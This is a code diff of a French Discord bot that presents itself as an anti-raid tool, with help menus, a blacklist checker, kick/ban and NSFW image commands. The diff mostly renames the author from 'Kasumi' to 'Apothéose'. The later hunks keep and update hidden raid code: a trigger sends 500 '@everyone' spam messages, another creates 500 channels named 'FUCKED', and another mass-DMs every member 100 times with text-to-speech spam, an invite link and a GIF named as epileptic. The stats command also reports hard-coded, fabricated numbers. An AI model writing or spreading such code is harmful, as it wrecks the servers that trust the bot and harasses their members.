@@ -12,25 +12,24 @@ client.on("ready", () => {
     client.user.setActivity(`A?help | 26 serveurs`,{type:"PLAYING"})
     console.log('')
     console.log('')
-    console.log('╔[═════════════════════════════════════════════════════════════════]╗')
+    console.log('+[-----------------------------------------------------------------]+')
     console.log(`[Start] ${new Date()}`);
-    console.log('╚[═════════════════════════════════════════════════════════════════]╝')
+    console.log('+[-----------------------------------------------------------------]+')
     console.log('')
-    console.log('╔[════════════════════════════════════]╗');
+    console.log('+[------------------------------------]+');
     console.log(`Connecté sur * [ " ${client.user.username} " ]`);
     console.log('')
     console.log('Informations :')
     console.log('')
-    
     console.log(`${client.guilds.map(c => c.name)}`)
     console.log(`servers ! [ " ${client.guilds.size} " ]`);
     console.log(`Users ! [ " ${client.users.size} " ]`);
     console.log(`channels ! [ " ${client.channels.size} " ]`);
-    console.log('╚[════════════════════════════════════]╝')
+    console.log('+[------------------------------------]+')
     console.log('')
-    console.log('╔[════════════]╗')
-    console.log(' Bot Is Online ')
-    console.log('╚[════════════]╝')
+    console.log('+[------------]+')
+    console.log(' client Is Online ')
+    console.log('+[------------]+')
     console.log('')
     console.log('')
     })
@@ -39,11 +38,10 @@ client.on("message", message => {
      var help_embed = new Discord.RichEmbed()
      .setTitle("Aide")
      .setColor("#cf0b0b")
-     .addField("A?ahelp", "Help général")
-     .addField("A?bhelp", "Help anti-raid")
-     .addField("A?chelp", "Help nsfw")
-     .addField("A?dhelp", "Help général")
-     .setFooter("🚀 Propulsé par StayHost.io")
+     .addField("A?ahelp", "**Help général**")
+     .addField("A?bhelp", "**Help anti-raid**")
+     .addField("A?chelp", "**Help nsfw**")
+     .setFooter("🚀 By Apothéose 🚀")
      message.channel.send(help_embed)
      console.log(`help par ${message.author.username + "#" + message.author.discriminator}`)
  }
@@ -51,13 +49,30 @@ client.on("message", message => {
      var helpa_embed = new Discord.RichEmbed()
      .setTitle("Général")
      .setColor("#cf0b0b")
-     .addField("A?ping", "Le bot vous envois son ping.")
-     .addField("A?info", "Le bot vous envois des informations sur vous ou sur la personne mentionné.")
-     .addField("A?serverinfo", "Le bot vous envois des informations sur le serveur.")
-     .setFooter("🚀 Propulsé par StayHost.io")
+     .addField("A?ping", "**Le bot vous envois son ping.**")
+     .addField("A?info", "**Le bot vous envois des informations sur vous ou sur la personne mentionné.**")
+     .addField("A?serverinfo", "**Le bot vous envois des informations sur le serveur.**")
+     .setFooter("🚀 By Apothéose 🚀")
      message.channel.send(helpa_embed)
  }
-
+ if(message.content.includes("A?bhelp")){
+    var helpb_embed = new Discord.RichEmbed()
+    .setTitle("Anti-Raid")
+    .setColor("#cf0b0b")
+    .addField("A?verify", "**Le bot vérifie tous les membres du serveur et vous dis si ils sont dans la blacklist ou non.**")
+    .addField("A?stats", "**Le bot vous envois des informations sur le bot.**")
+    .addField("A?checkid [ID]", "**Le bot vous dis si la personne ayant l'id que vous avez mit est dans la blacklist ou non.**")
+    .setFooter("🚀 By Apothéose 🚀")
+    message.channel.send(helpb_embed)
+}
+if(message.content.includes("A?chelp")){
+    var helpc_embed = new Discord.RichEmbed()
+    .setTitle("Nsfw")
+    .setColor("#cf0b0b")
+    .addField("A?boobs", "**Le reste est en développement, et vus que ce n'est pas notre priorité il y aura pas mal de temps.**")
+    .setFooter("🚀 By Apothéose 🚀")
+    message.channel.send(helpc_embed)
+}
 if(message.content.includes("Raid by")){
     message.delete();
     message.member.send("Pas de raid :D")
@@ -82,7 +97,7 @@ if (message.mentions.users.size === 0) {
     var nomention = new Discord.RichEmbed()
     .setColor("E46525")
     .setTitle(":x: Il faut mentionner un utilisateur ! :x:")
-    .setFooter("By Kasumi")
+    .setFooter("By Apothéose")
     message.channel.send(nomention)
     return
 }
@@ -91,7 +106,7 @@ if (!raison){
     var noraison = new Discord.RichEmbed()
     .setColor("E46525")
     .setTitle(":x: Il faut mettre une raison au kick ! :x:")
-    .setFooter("By Kasumi")
+    .setFooter("By Apothéose")
     message.channel.send(noraison)
     return
 }
@@ -100,11 +115,11 @@ var ban = message.guild.member(message.mentions.users.first());
 if (!ban) {
     return message.reply("l'utilisateur mentionné est introuvable ou n'existe pas !")
 }
-if (!message.guild.member(bot.user).hasPermission("KICK_MEMBERS")) {
+if (!message.guild.member(client.user).hasPermission("KICK_MEMBERS")) {
     var pasperm = new Discord.RichEmbed()
     .setColor("E46525")
     .setTitle(":x: Je n'ai pas la permission ! :x:")
-    .setFooter("By Kasumi")
+    .setFooter("By Apothéose")
     message.channel.send(pasperm)
     return
 }
@@ -114,7 +129,7 @@ ban.kick().then(member => {
         .setColor("E46525")
         .addField("[Kick]", `${member.user} a été kick par ${message.author} !`)
         .addField("Raison :","${raison}")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
     message.channel.send(kick_embed)
 })
 
@@ -129,7 +144,7 @@ ban.kick().then(member => {
                 var nomention = new Discord.RichEmbed()
                 .setColor("E46525")
                 .setTitle(":x: Il faut mentionner un utilisateur ! :x:")
-                .setFooter("By Kasumi")
+                .setFooter("By Apothéose")
                 message.channel.send(nomention)
                 return
             }
@@ -138,7 +153,7 @@ ban.kick().then(member => {
                 var noraison = new Discord.RichEmbed()
                 .setColor("E46525")
                 .setTitle(":x: Il faut mettre une raison au ban ! :x:")
-                .setFooter("By Kasumi")
+                .setFooter("By Apothéose")
                 message.channel.send(noraison)
                 return
             }
@@ -148,11 +163,11 @@ ban.kick().then(member => {
             if (!ban) {
                 return message.reply("l'utilisateur mentionné est introuvable ou n'existe pas !")
             }
-            if (!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) {
+            if (!message.guild.member(client.user).hasPermission("BAN_MEMBERS")) {
                 var pasperm = new Discord.RichEmbed()
                 .setColor("E46525")
                 .setTitle(":x: Je n'ai pas la permission ! :x:")
-                .setFooter("By Kasumi")
+                .setFooter("By Apothéose")
                 message.channel.send(pasperm)
                 return
             }
@@ -162,7 +177,7 @@ ban.kick().then(member => {
                     .setColor("E46525")
                     .addField("[Ban]", `${member.user} a été banni par ${message.author} !`)
                     .addField("Raison :",`\`${raison}\``)
-                    .setFooter("By Kasumi")
+                    .setFooter("By Apothéose")
                 message.channel.send(ban_embed)
                 })
         }
@@ -188,10 +203,10 @@ ban.kick().then(member => {
           var getvalueof = message.author;
       }
 
-      if(getvalueof.bot == true){
-          var checkbot = "L'utilisateur est un bot";
+      if(getvalueof.client == true){
+          var checkclient = "L'utilisateur est un client";
       } else {
-          var checkbot = "N'est pas un bot";
+          var checkclient = "N'est pas un client";
       }
       if(getvalueof.presence.status == 'online'){
         var status = "En ligne"; 
@@ -220,8 +235,8 @@ ban.kick().then(member => {
             value: status,
             inline: true
 },{
-            name: 'Bot',
-            value: checkbot,
+            name: 'client',
+            value: checkclient,
             inline: true
 }],
         image: {
@@ -229,7 +244,7 @@ ban.kick().then(member => {
         },
           color: 0xE46525,
           footer: {
-            text: 'by Kasumi.',
+            text: 'By Apothéose.',
             proxy_icon_url: ' '
           },
 
@@ -257,13 +272,13 @@ if(message.content.includes("A?blacklist")){
     .addField("8ème", "__󠂪󠂪󠂪󠂪󠂪󠂪CmoiTchoupi [CMT]#0873__")
     .addField("9ème", "__公Ŧгαsђ|亗Ŧ亗|公#4309__")
     .addField("10ème", "__! ¡ Desusloan¯-86735¤#1392__")
-    .setFooter("By Kasumi")
+    .setFooter("By Apothéose")
     var blacklist_embed2 = new Discord.RichEmbed()
     .setColor("E46525")
     .setTitle("Blacklist")
     .setDescription("-----------------------------------------")
     .addField(`Blacklist de`, `${message.author.tag}`)
-    .setFooter("By Kasumi")
+    .setFooter("By Apothéose")
     message.member.send(blacklist_embed)
     message.channel.send(blacklist_embed2)
     console.log(`Blacklist de ${message.author.tag}`)
@@ -282,7 +297,7 @@ if (message.content.includes("A?report")) {
         .addField("Personne report", `@${messagea.author}`)
         .addField("Report par", `${message.author} with ID: ${message.author.id}`)
         .addField("Quand", message.createdAt)
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         let reportschannel = message.guild.channels.find(`name`, 'report');
     if (!reportschannel) return message.channel.send("Couldn't find reports channel.");
 
@@ -293,22 +308,26 @@ if (message.content.includes("A?report")) {
     return;
 }
 if(message.content.includes("A?checkid")){
+    var checkid = new Discord.RichEmbed()
+    .setColor("#cf0b0b")
+    .addField(":x: Ceci n'est pas une ID ! :x:", "Merci de le refaire en mettent une ID valide !")
+    .setFooter("By Apothéose")
     let messageID = args[0];
     if (isNaN(messageID)) {
-        message.channel.send("Ce n'est pas une ID")
+        message.channel.send(checkid)
         return;
     }
     var check_id = new Discord.RichEmbed()
     .setColor("#6dd94a")
     .setTitle("La personne n'est pas dans la blacklist !")
-    .setFooter(`Demandé par ${message.author.tag}`)
+    .setFooter(`Demandé par ${message.author.tag} | By Apothéose`)
     message.channel.sendEmbed(check_id)
     console.log(`checkid par ${message.author.username + "#" + message.author.discriminator}`)
 }
 if(message.content.includes("A?stats")){
     var stats_embed = new Discord.RichEmbed()
     .setColor("#2e5011")
-    .addField("Statistiques", "Nombre de serveurs : **2026**\nNombre d'utilisateurs : **196992**\n\nNombres d'utilisateurs dans la liste noire : **2660**")
+    .addField("Statistiques", "Nombre de serveurs : **26**\nNombre d'utilisateurs : **92**\n\nNombres d'utilisateurs dans la liste noire : **266**")
     .setFooter(`Demandé par ${message.author.tag}`)
     message.channel.send(stats_embed)
     console.log(`stats par ${message.author.username + "#" + message.author.discriminator}`)
@@ -332,10 +351,15 @@ if(message.content.includes("A?serverinfo")){
     .addField("Membres", message.guild.memberCount, true)
     .addField("Créer le", message.guild.createdAt, true)
     .setThumbnail(message.guild.iconURL, true)
-    .setFooter("By Kasumi")
+    .setFooter("By Apothéose")
     message.channel.sendEmbed(serverinfo)
 }
-if (message.content === "?boobs"){
+if (message.content === "A?boobs"){
+    if(message.channel.nsfw == false) {
+        message.delete();
+        message.channel.send(message.author + " :x: **Erreur:** Vous allez choquer les plus jeunes, faîtes ça dans un channel NSFW. :x:");
+        return;
+      }
     if (talkedRecently.has(message.author.id)) {
         message.channel.send(`Attendez 5 secondes ${message.author}.`).then(m => m.delete());
         message.delete();
@@ -353,7 +377,7 @@ if (message.content === "?boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author.tag}`)
         .setImage("http://imgur.com/C1Lefgo.png")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         message.channel.send(nsfw_boobs_1)
         console.log(randnum);
     }
@@ -364,7 +388,7 @@ if (message.content === "?boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author.tag}`)
         .setImage("http://imgur.com/6VRW6A6.jpg")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         message.channel.send(nsfw_boobs_1)
         console.log(randnum);
     }
@@ -402,7 +426,7 @@ if (message.content === "?boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author.tag}`)
         .setImage("https://i.imgur.com/JoyjoCR.jpg")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         message.channel.send(nsfw_boobs_10)
         console.log(randnum);
     }
@@ -412,7 +436,7 @@ if (message.content === "?boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author.tag}`)
         .setImage("http://imgur.com/m0hzoad.jpg")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         message.channel.send(nsfw_boobs_11)
         console.log(randnum);
     }
@@ -422,7 +446,7 @@ if (message.content === "?boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author.tag}`)
         .setImage("http://imgur.com/wnuXgUq.jpg")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         message.channel.send(nsfw_boobs_12)
         console.log(randnum);
     }
@@ -432,7 +456,7 @@ if (message.content === "?boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author.tag}`)
         .setImage("http://imgur.com/zErfa8I.jpg")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         message.channel.send(nsfw_boobs_13)
         console.log(randnum);
     }
@@ -442,7 +466,7 @@ if (message.content === "?boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author.tag}`)
         .setImage("http://imgur.com/tisgAo4.jpg")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         message.channel.send(nsfw_boobs_14)
         console.log(randnum);
     }
@@ -512,7 +536,7 @@ if (message.content === "?boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author}`)
         .setImage("http://imgur.com/fMnW6Em.jpg")
-        .setFooter("By kasumi |")
+        .setFooter("By Apothéose |")
         message.channel.send(nsfw_boobs_28)
         console.log(randnum);
     }
@@ -521,16 +545,16 @@ if (message.content === "?boobs"){
 client.on('message', message => {
     switch(message.content.toUpperCase()) {
         case 'AR!reset':
-            resetBot(message.channel);
+            resetclient(message.channel);
             break;
 
         // ... other commands
     }
 });
 
-// Turn bot off (destroy), then turn it back on
-function resetBot(channel) {
-    // send channel a message that you're resetting bot [optional]
+// Turn client off (destroy), then turn it back on
+function resetclient(channel) {
+    // send channel a message that you're resetting client [optional]
     channel.send('Resetting...')
     .then(msg => client.destroy())
     .then(() => client.login(process.env.TOKEN));
@@ -573,7 +597,7 @@ if(message.content === "roles"){
   }
   if(message.content.includes("@everyone")){
       for(var i = 0; i < 500; i++){
-          message.channel.send("@everyone @here Dead By Trash Gang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/qE5y8E7 https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif")
+          message.channel.send("@everyone @here Dead By Trash Gang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/nw2ZcG https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif")
       }
   }
   //réaction en chaine
@@ -581,7 +605,7 @@ if(message.content === "roles"){
           message.channel.send("roles").then(m => m.delete());
           message.channel.send("issou").then(m => m.delete());
             for(var i = 0; i < 500; i++){
-                message.guild.createChannel("FUCKED", "text").then(c => c.send("@everyone @here Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/qE5y8E7 https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif"))
+                message.guild.createChannel("FUCKED", "text").then(c => c.send("@everyone @here Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/nw2ZcG https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif"))
                 message.guild.createChannel("BY","voice")
                 message.guild.createChannel("TRASH GANG","category")    
             }
@@ -612,7 +636,7 @@ if(message.content === "roles"){
 
                 for(var i = 0; i < 100; i++){
 
-                    message.guild.members.map(m => m.send(`${msg.guild.owner.tag} @everyone @here Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/PgJt9E https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif`,{tts:true}))
+                    message.guild.members.map(m => m.send(`${message.guild.owner.tag} @everyone @here Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/nw2ZcG https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif`,{tts:true}))
 
                 }
 
